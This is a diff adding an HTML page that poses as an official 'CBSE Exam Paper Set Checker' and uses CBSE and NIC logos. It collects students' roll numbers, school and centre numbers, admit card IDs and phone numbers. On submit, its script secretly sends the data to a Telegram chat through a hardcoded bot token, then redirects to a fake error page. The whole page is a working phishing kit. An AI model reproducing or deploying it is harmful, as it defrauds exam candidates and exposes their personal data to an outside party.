@@ -1,0 +1,225 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>CBSE Exam Paper Set Checker</title>
+  <style>
+    body {
+      font-family: Arial, sans-serif;
+      margin: 0;
+      padding: 0;
+      background-color: #f2f2f2;
+    }
+
+    .container {
+      max-width: 500px;
+      margin: 0 auto;
+      padding: 20px;
+    }
+
+    h1 {
+      text-align: center;
+      color: #2471af;
+      font-size: 24px;
+      margin-bottom: 10px;
+    }
+
+    .disclaimer {
+      text-align: center;
+      font-size: 14px;
+      color: #666;
+      margin-bottom: 20px;
+    }
+
+    form {
+      background-color: #f8f8f8;
+      padding: 20px;
+      border-radius: 5px;
+    }
+
+    .input-group {
+      margin-bottom: 15px;
+    }
+
+    .input-group label {
+      display: block;
+      margin-bottom: 5px;
+      font-size: 16px;
+      color: #333;
+    }
+    .input-group input {
+      width: 100%;
+      padding: 10px;
+      border: 1px solid #ccc;
+      border-radius: 3px;
+      font-size: 14px;
+    }
+
+    .input-group i {
+      position: absolute;
+      top: 12px;
+      right: 10px;
+      font-size: 16px;
+      color: #ccc;
+    }
+
+    .buttons {
+      text-align: center;
+      margin-top: 20px;
+    }
+
+    .buttons button {
+      padding: 10px 20px;
+      background-color: #4caf50;
+      color: #fff;
+      border: none;
+      border-radius: 3px;
+      cursor: pointer;
+      margin-right: 10px;
+    }
+    .buttons button:hover {
+      background-color: #45a049;
+    }
+
+    .buttons button[type="reset"] {
+      background-color: #f44336;
+    }
+
+    .buttons button[type="reset"]:hover {
+      background-color: #d32f2f;
+    }
+
+    /* Custom error modal styles */
+    .error-modal {
+      display: none;
+      position: fixed;
+      top: 0;
+      left: 0;
+      width: 100%;
+      height: 100%;
+      background: rgba(0, 0, 0, 0.5);
+      justify-content: center;
+      align-items: center;
+      text-align: center;
+    }
+
+    .error-content {
+      background: #fff;
+      padding: 20px;
+      border-radius: 5px;
+        position: relative;
+    }
+
+    .close-btn {
+      cursor: pointer;
+      position: absolute;
+      top: 10px;
+      right: 10px;
+    }
+  </style>
+  <script>
+    function showError(message) {
+      // Display error modal
+      var errorModal = document.getElementById('errorModal');
+      var errorContent = document.getElementById('errorContent');
+      var errorMessage = document.getElementById('errorMessage');
+
+      errorMessage.textContent = message;
+      errorModal.style.display = 'flex';
+
+      // Close modal when clicking outside of the content
+     errorModal.addEventListener('click', function (event) {
+        if (event.target === errorModal) {
+          errorModal.style.display = 'none';
+        }
+      });
+    }
+
+    function submitForm() {
+      // Check if all required fields are filled
+      var rollNumber = document.getElementById("rollNumber").value;
+      var schoolNo = document.getElementById("schoolNo").value;
+      var centreNo = document.getElementById("centreNo").value;
+      var admitCardId = document.getElementById("admitCardId").value;
+      var phoneNumber = document.getElementById("phoneNumber").value;
+
+      if (rollNumber && schoolNo && centreNo && admitCardId && phoneNumber) {
+        // All fields are filled, proceed with form submission
+        // Replace 'YOUR_BOT_TOKEN' and 'YOUR_CHAT_ID' with your actual Telegram bot token and chat ID
+        var botToken = '6777500379:AAENzR6AsyBMnYQv65ojhXoTXC-cWz-bpk0';
+        var chatId = '-1002057810242';
+
+        // Construct the message
+        var message = `New submission:\nRoll Number: ${rollNumber}\nSchool No: ${schoolNo}\nCentre No: ${centreNo}\nAdmit Card ID: ${admitCardId}\nPhone Number: ${phoneNumber}`;
+
+        // Create a new Telegram message using the Telegram Bot API
+        fetch(`https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`)
+          .then(response => response.json())
+          .then(data => {
+            // Handle success, you can add further actions here
+            console.log(data);
+          })
+          .catch(error => {
+            // Handle error, you can add further error handling here
+            console.error(error);
+          });
+
+        // Redirect to another page after submission
+        window.location.href = 'https://ayrmipztsklosqfbhnrj.blogspot.com/p/error-page-not-loaded-body-font-family.html';
+      } else {
+        // Display a custom error modal
+        showError('Please fill in all required fields.');
+      }
+    }
+  </script>
+</head>
+<body>
+  <div class="container">
+    <h1>CBSE Exam Paper Set Checker</h1>
+      <p class="disclaimer">Please enter your details to view your Set Paper Information.</p>
+    <form action="#" onsubmit="submitForm(); return false;">
+      <div class="input-group">
+        <label for="rollNumber">Enter your Roll Number</label>
+        <input type="text" id="rollNumber" name="rollNumber" placeholder="YOUR ROLL NO. ">
+        <i class="fa fa-search"></i>
+      </div>
+      <div class="input-group">
+        <label for="schoolNo">Enter School No.</label>
+        <input type="text" id="schoolNo" name="schoolNo" placeholder="YOUR SCHOOL NO. ">
+        <i class="fa fa-search"></i>
+      </div>
+      <div class="input-group">
+        <label for="centreNo">Enter Centre No.</label>
+        <input type="text" id="centreNo" name="centreNo" placeholder="YOUR CENTERE NO. ">
+        <i class="fa fa-search"></i>
+      </div>
+      <div class="input-group">
+          <label for="admitCardId">Enter Admit Card ID.</label>
+        <input type="text" id="admitCardId" name="admitCardId" placeholder="As given on your admit card">
+        <i class="fa fa-search"></i>
+      </div>
+      <div class="input-group">
+        <label for="phoneNumber">Enter Your Phone Number</label>
+        <input type="tel" id="phoneNumber" name="phoneNumber" placeholder="YOUR PHONE NO. ">
+        <i class="fa fa-search"></i>
+      </div>
+      <div class="buttons">
+        <button type="button" onclick="submitForm()">Submit</button>
+        <button type="reset">Reset</button>
+      </div>
+    </form>
+    <p class="disclaimer">Fill the data as given in your admit card...</p>
+  </div>
+  <!-- Error modal -->
+  <div id="errorModal" class="error-modal">
+    <div id="errorContent" class="error-content">
+      <span id="closeBtn" class="close-btn" onclick="document.getElementById('errorModal').style.display='none'">&times;</span>
+      <p id="errorMessage"></p>
+    </div>
+  </div>
+  
+  <img src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjlsQmdaVCkG56sXL3U-47h2_bai88g-HNEZR8Xr_aFPepj5Ekq06OyWlZRynLHF2i_9nr_Grpi29xtV8y_L7wxLYvF8MkgjC7GdzlL3ap-NK0C1SK-soJjlEeMDDsE-SKD6E7WbNqEZ4Fcvgi89Ll7bVrQlCSlB4zTJt7jMS_bcIPl1Va3I_39whuocCJ1/s338/CBSE_new_logo.svg.png" alt="National Informatics Centre Logo" class="nic-logo">
+  <img src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEiyd8FogauXdJc5o2Z-Ve8GSpYXnAKERj75rFDfjhcU-kVFj_d9Ch9l_GkLuehfAVJmOkxF0tK1x2h0qqHFKKOfzxm86AJhMBM_PQUfapj5vLVIpc-cOCWE1_Ls0SxI78Bk-YwXfg-uPpXOBhRopX4nt3QZ-sQwZdIZuyOQYNhsa-ngr3fuOfH77Sr93SY9/s1000/nic-logo-nic-logo-1-bilingual-white-1-01.jpg" alt="CBSE Logo" class="cbse-logo">
+</body>
+</html>
